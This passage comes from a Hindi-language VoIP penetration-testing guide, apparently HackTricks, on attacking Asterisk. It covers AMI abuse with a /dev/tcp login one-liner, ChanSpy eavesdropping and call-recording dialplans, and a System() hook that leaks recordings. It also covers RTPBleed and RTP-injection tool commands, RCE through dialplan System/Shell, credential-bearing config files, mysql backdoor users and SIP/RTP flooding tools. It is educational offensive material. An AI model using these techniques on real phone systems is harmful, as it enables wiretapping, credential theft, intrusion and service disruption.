allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
- पिछला प्रोफ़ाइल **किसी भी IP पते को कनेक्ट करने की अनुमति दे रहा है** (यदि पासवर्ड ज्ञात है)।
- **एक कॉल आयोजित करने के लिए**, जैसा कि पहले निर्दिष्ट किया गया है, **कोई पढ़ने की अनुमति आवश्यक नहीं है** और **केवल** **लिखने में उत्पन्न** होना आवश्यक है।

इन अनुमतियों के साथ, कोई भी IP जो पासवर्ड जानता है, कनेक्ट कर सकता है और बहुत अधिक जानकारी निकाल सकता है, जैसे:
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
**अधिक जानकारी या क्रियाएँ मांगी जा सकती हैं।**

### **ईव्सड्रॉपिंग**

Asterisk में **`ChanSpy`** कमांड का उपयोग करना संभव है, जो **निगरानी करने के लिए विस्तार(s)** (या सभी) को इंगित करता है ताकि हो रही बातचीत को सुना जा सके। इस कमांड को एक विस्तार को सौंपा जाना चाहिए।

उदाहरण के लिए, **`exten => 333,1,ChanSpy('all',qb)`** यह इंगित करता है कि यदि आप **विस्तार 333** पर **कॉल** करते हैं, तो यह **`all`** विस्तारों की **निगरानी** करेगा, **जब भी एक नई बातचीत शुरू होती है** (**`b`**) तो **सुनना शुरू करेगा** शांत मोड (**`q`**) में क्योंकि हम इसमें हस्तक्षेप नहीं करना चाहते। आप **`*`** दबाकर या विस्तार संख्या को चिह्नित करके एक बातचीत से दूसरी बातचीत में जा सकते हैं।

केवल एक विस्तार की निगरानी करने के लिए **`ExtenSpy`** का उपयोग करना भी संभव है।

बातचीत को सुनने के बजाय, उन्हें फ़ाइलों में **रिकॉर्ड** करना संभव है, जैसे:
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
कॉल **`/tmp`** में सहेजे जाएंगे।

आप Asterisk को **एक स्क्रिप्ट निष्पादित करने** के लिए भी बना सकते हैं जो कॉल बंद होने पर **लीक** कर देगी।
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed भेद्यता

**RTCPBleed** एक प्रमुख सुरक्षा समस्या है जो Asterisk-आधारित VoIP सर्वरों को प्रभावित करती है (2017 में प्रकाशित)। यह भेद्यता **RTP (Real Time Protocol) ट्रैफ़िक** को **इंटरनेट पर किसी भी व्यक्ति द्वारा इंटरसेप्ट और रीडायरेक्ट** करने की अनुमति देती है, जो VoIP वार्तालापों को ले जाती है। यह इसलिए होता है क्योंकि RTP ट्रैफ़िक NAT (Network Address Translation) फ़ायरवॉल के माध्यम से नेविगेट करते समय प्रमाणीकरण को बायपास करता है।

RTP प्रॉक्सी RTC सिस्टम को प्रभावित करने वाली **NAT सीमाओं** को संबोधित करने के लिए दो या अधिक पक्षों के बीच RTP स्ट्रीम को प्रॉक्सी करके प्रयास करती हैं। जब NAT लागू होता है, तो RTP प्रॉक्सी सॉफ़्टवेयर अक्सर सिग्नलिंग (जैसे SIP) के माध्यम से प्राप्त RTP IP और पोर्ट जानकारी पर भरोसा नहीं कर सकता। इसलिए, कई RTP प्रॉक्सियों ने एक तंत्र लागू किया है जहाँ ऐसा **IP और पोर्ट टुपलेट स्वचालित रूप से सीखा जाता है**। यह अक्सर आने वाले RTP ट्रैफ़िक का निरीक्षण करके और किसी भी आने वाले RTP ट्रैफ़िक के लिए स्रोत IP और पोर्ट को चिह्नित करके किया जाता है जिसे प्रतिक्रिया दी जानी चाहिए। इस तंत्र को "सीखने के मोड" कहा जा सकता है, **यह किसी प्रकार के प्रमाणीकरण का उपयोग नहीं करता**। इसलिए **हमलावर** **RTP ट्रैफ़िक RTP प्रॉक्सी को भेज सकते हैं** और उस प्रॉक्सी किए गए RTP ट्रैफ़िक को प्राप्त कर सकते हैं जो एक चल रहे RTP स्ट्रीम के कॉलर या कली के लिए होना चाहिए। हम इस भेद्यता को RTP Bleed कहते हैं क्योंकि यह हमलावरों को वैध उपयोगकर्ताओं के लिए भेजे जाने वाले RTP मीडिया स्ट्रीम प्राप्त करने की अनुमति देता है।

RTP प्रॉक्सियों और RTP स्टैक्स का एक और दिलचस्प व्यवहार यह है कि कभी-कभी, **भले ही RTP Bleed के लिए संवेदनशील न हों**, वे **किसी भी स्रोत से RTP पैकेट स्वीकार, अग्रेषित और/या संसाधित करेंगे**। इसलिए हमलावर RTP पैकेट भेज सकते हैं जो उन्हें वैध मीडिया के बजाय अपना मीडिया इंजेक्ट करने की अनुमति दे सकते हैं। हम इस हमले को RTP इंजेक्शन कहते हैं क्योंकि यह मौजूदा RTP स्ट्रीम में अवैध RTP पैकेटों के इंजेक्शन की अनुमति देता है। यह भेद्यता RTP प्रॉक्सियों और एंडपॉइंट्स दोनों में पाई जा सकती है।

Asterisk और FreePBX ने पारंपरिक रूप से **`NAT=yes` सेटिंग** का उपयोग किया है, जो RTP ट्रैफ़िक को प्रमाणीकरण को बायपास करने की अनुमति देता है, जिससे कॉल पर कोई ऑडियो या एकतरफा ऑडियो हो सकता है।

अधिक जानकारी के लिए देखें [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

- **`SIPPTS rtpbleed`** से [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed RTP स्ट्रीम भेजकर RTP Bleed भेद्यता का पता लगाता है।
```bash
sippts rtpbleed -i 10.10.0.10
```
- **`SIPPTS rtcpbleed`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed RTP Bleed कमजोरियों का पता लगाता है RTCP स्ट्रीम भेजकर।
```bash
sippts rtcpbleed -i 10.10.0.10
```
- **`SIPPTS rtpbleedflood`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedflood RTP ब्लीड कमजोरियों का शोषण RTP स्ट्रीम भेजकर करता है।
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
- **`SIPPTS rtpbleedinject`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinject RTP Bleed कमजोरियों का फायदा उठाते हुए एक ऑडियो फ़ाइल (WAV प्रारूप) को इंजेक्ट करता है।
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

Asterisk में आप किसी तरह **एक्सटेंशन नियम जोड़ने और उन्हें फिर से लोड करने** में सक्षम होते हैं (उदाहरण के लिए, एक कमजोर वेब प्रबंधक सर्वर से समझौता करके), **`System`** कमांड का उपयोग करके RCE प्राप्त करना संभव है।
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
एक कमांड है **`Shell`** जिसे आवश्यकतानुसार सिस्टम कमांड निष्पादित करने के लिए **`System`** के बजाय उपयोग किया जा सकता है।

> [!WARNING]
> यदि सर्वर **`System`** कमांड में **कुछ विशेष वर्णों** के उपयोग की **अनुमति नहीं दे रहा है** (जैसे Elastix में), तो जांचें कि क्या वेब सर्वर **किसी तरह से सिस्टम के अंदर फ़ाइलें बनाने** की अनुमति देता है (जैसे Elastix या trixbox में), और इसका उपयोग **एक बैकडोर स्क्रिप्ट बनाने** के लिए करें और फिर **`System`** का उपयोग करके उस **स्क्रिप्ट** को **निष्पादित** करें।

#### दिलचस्प स्थानीय फ़ाइलें और अनुमतियाँ

- **`sip.conf`** -> SIP उपयोगकर्ताओं का पासवर्ड शामिल है।
- यदि **Asterisk सर्वर रूट के रूप में चल रहा है**, तो आप रूट को समझौता कर सकते हैं।
- **mysql रूट उपयोगकर्ता** का **कोई पासवर्ड नहीं हो सकता**।
- इसका उपयोग एक नए mysql उपयोगकर्ता को बैकडोर के रूप में बनाने के लिए किया जा सकता है।
- **`FreePBX`**
- **`amportal.conf`** -> वेब पैनल प्रशासक (FreePBX) का पासवर्ड शामिल है।
- **`FreePBX.conf`** -> डेटाबेस तक पहुँचने के लिए उपयोगकर्ता FreePBXuser का पासवर्ड शामिल है।
- इसका उपयोग एक नए mysql उपयोगकर्ता को बैकडोर के रूप में बनाने के लिए किया जा सकता है।
- **`Elastix`**
- **`Elastix.conf`** -> mysql रूट पास, IMAPd पास, वेब प्रशासक पास जैसे कई पासवर्ड स्पष्ट पाठ में शामिल हैं।
- **कई फ़ोल्डर** समझौता किए गए asterisk उपयोगकर्ता के अंतर्गत आएंगे (यदि रूट के रूप में नहीं चल रहा है)। यह उपयोगकर्ता पिछले फ़ाइलों को पढ़ सकता है और साथ ही कॉन्फ़िगरेशन को नियंत्रित कर सकता है, इसलिए वह Asterisk को निष्पादित होने पर अन्य बैकडोर बाइनरी लोड करने के लिए बना सकता है।

### RTP इंजेक्शन

यह **`.wav`** को बातचीत में डालना संभव है, जैसे उपकरणों का उपयोग करके **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) और **`rtpmixsound`** (`sudo apt install rtpmixsound`)।

या आप [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) से स्क्रिप्ट का उपयोग कर सकते हैं **बातचीत को स्कैन करने** के लिए (**`rtpscan.pl`**), बातचीत में एक `.wav` भेजने के लिए (**`rtpsend.pl`**) और बातचीत में **शोर डालने** के लिए (**`rtpflood.pl`**)।

### DoS

VoIP सर्वरों में DoS प्राप्त करने के कई तरीके हैं।

- **`SIPPTS flood`** [**sippts**](https://github.com/Pepelux/sippts)\*\* से: SIPPTS flood लक्षित पर अनंत संदेश भेजता है।
- `sippts flood -i 10.10.0.10 -m invite -v`
- **`SIPPTS ping`** [**sippts**](https://github.com/Pepelux/sippts)\*\* से: SIPPTS ping सर्वर प्रतिक्रिया समय देखने के लिए एक SIP पिंग करता है।
- `sippts ping -i 10.10.0.10`
- [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): Asterisk द्वारा उपयोग किया जाने वाला DoS IAX प्रोटोकॉल।
- [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): UDP/IP पर SIP/SDP INVITE संदेश बाढ़ करने के लिए एक उपकरण।
- [**rtpflood**](https://www.kali.org/tools/rtpflood/): कई अच्छी तरह से निर्मित RTP पैकेट भेजें। RTP पोर्ट जानना आवश्यक है जो उपयोग किए जा रहे हैं (पहले स्निफ़ करें)।
- [**SIPp**](https://github.com/SIPp/sipp): SIP ट्रैफ़िक का विश्लेषण और उत्पन्न करने की अनुमति देता है। इसलिए इसका उपयोग DoS के लिए भी किया जा सकता है।
- [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP स्विस आर्मी चाकू। इसका उपयोग SIP हमलों को करने के लिए भी किया जा सकता है।
- फज़र्स: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper)。

### OS कमजोरियाँ

Asterisk जैसे सॉफ़्टवेयर को स्थापित करने का सबसे आसान तरीका एक **OS वितरण** डाउनलोड करना है जिसमें यह पहले से स्थापित है, जैसे: **FreePBX, Elastix, Trixbox**... इनका समस्या यह है कि एक बार यह काम करने के बाद सिस्टम प्रशासक शायद **इन्हें फिर से अपडेट नहीं करें** और **कमजोरियाँ** समय के साथ खोजी जाएँगी।

## संदर्भ

- [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
- [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
- [http://blog.pepelux.org/](http://blog.pepelux.org/)
- [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
- [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
- [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

{{#include ../../banners/hacktricks-training.md}}
